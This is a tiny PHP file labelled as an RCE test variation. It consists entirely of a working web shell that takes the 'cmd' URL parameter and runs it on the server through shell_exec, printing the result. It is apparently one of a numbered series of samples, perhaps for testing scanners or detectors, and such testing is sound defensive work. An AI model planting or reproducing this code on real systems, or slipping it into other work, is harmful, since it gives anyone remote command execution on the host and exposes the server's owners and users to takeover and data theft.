<?php
// RCE test variation #565
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>